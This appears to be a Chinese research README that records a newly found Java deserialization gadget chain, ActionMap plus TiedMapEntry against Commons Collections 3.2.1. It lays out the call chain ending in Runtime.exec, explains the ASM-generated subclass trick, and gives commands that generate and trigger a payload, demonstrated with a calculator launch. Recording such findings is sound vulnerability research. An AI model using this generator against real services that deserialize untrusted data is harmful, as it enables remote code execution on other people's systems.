# 成果归档：ActionMap + TiedMapEntry Gadget

发现时间：2026-08-04  
环境：Commons Collections 3.2.1 + JDK（含 `java.desktop`）

## 链（实测可通）

```text
sast.gadget.ActionMapGadget#readObject
  → ActionMap#put
  → ArrayTable#put / containsKey
  → TiedMapEntry#equals
  → TiedMapEntry#getValue
  → LazyMap#get
  → ChainedTransformer#transform
  → InvokerTransformer#transform
  → (可选) StackProbe.printChain   // 打印调用栈
  → Runtime.exec(...)
```

形态上是 **CC6 同构**：用 `ActionMap` 反序列化入口替代 `HashMap`/`Hashtable`，  
key 放 `TiedMapEntry(LazyMap(InvokerTransformer…))`，再用第二个 `Map.Entry` 触发 `equals`。

## 为何需要 ASM 子类

原生 `ActionMap#writeObject` → `ArrayTable.writeArrayTable` → `get(key)`  
会在**序列化阶段**调用 `TiedMapEntry#hashCode/equals`，提前引爆并把 key 写进 LazyMap；  
之后单独 `Deserialize` 往往不再执行。  
因此用 ASM 生成 `ActionMapGadget`：字段直写，只在 `readObject` 里 `put` 触发。

## 目录内容

| 文件 | 说明 |
|------|------|
| `ActionMapAsmPayloadGen.java` | 反射 + ASM 生成 payload / `.class` / `.ser` |
| `Deserialize.java` | 反序列化触发 |
| `ActionMapTiedMapGadget.java` | 早期手写子类版本（对照用） |
| `asm_actionmap.ser` | 已生成 payload（含 StackProbe） |
| `generated/sast/gadget/*.class` | ASM 产出类 |
| `commons-collections-3.2.1.jar` / `asm-9.7.jar` | 依赖 |

## 复现

```bash
cd results/actionmap_tiedmap_gadget

# 已有 .ser 时直接测
java -cp ".:generated:commons-collections-3.2.1.jar" Deserialize asm_actionmap.ser

# 或重新生成
javac -cp "commons-collections-3.2.1.jar:asm-9.7.jar" ActionMapAsmPayloadGen.java Deserialize.java
java --add-opens java.desktop/javax.swing=ALL-UNNAMED \
  -cp ".:commons-collections-3.2.1.jar:asm-9.7.jar" \
  ActionMapAsmPayloadGen 'open -a Calculator' asm_actionmap.ser
java -cp ".:generated:commons-collections-3.2.1.jar" Deserialize asm_actionmap.ser
```

反序列化时 stderr 会打印 `StackProbe` 调用栈，然后执行命令。

## 备注

- `InputMap` **不行**：`readObject` 里 key 强转 `KeyStroke`，不能放 `TiedMapEntry`。
- 分析器 novel 里曾扫到 `ActionMap → equals → TiedMapEntry → LazyMap`，本目录为人工确认后的可利用成果。
